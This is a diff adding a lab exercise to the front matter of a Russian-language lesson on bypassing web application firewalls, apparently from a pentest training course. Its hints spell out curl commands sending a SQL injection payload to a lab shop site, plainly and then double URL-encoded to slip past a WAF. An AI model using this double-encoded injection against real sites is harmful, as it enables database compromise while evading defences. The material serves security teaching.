@@ -13,6 +13,19 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 42
 summary: "Продвинутый обход WAF: многослойное кодирование, Unicode/overlong, charset confusion, chunked/TE, HPP и нормализация."
+lab:
+  kind: shell
+  title: "Практика: обход WAF двойным кодированием"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Обычный payload ловится: curl -s 'https://shop.local/search?q=test%27%20OR%201%3D1--' -o /dev/null -w '%{http_code}'"
+    - "WAF декодирует один раз; приложение — ещё раз. Закодируй payload дважды."
+    - "%25 — это %, поэтому %2527 после первого декодирования даёт %27 (безобидно)."
+    - "Отправь двойное кодирование: curl -s 'https://shop.local/search?q=%2527%2520OR%25201%253D1--' > found.txt"
+
 ---
 
 ## Вопрос, с которого всё начинается
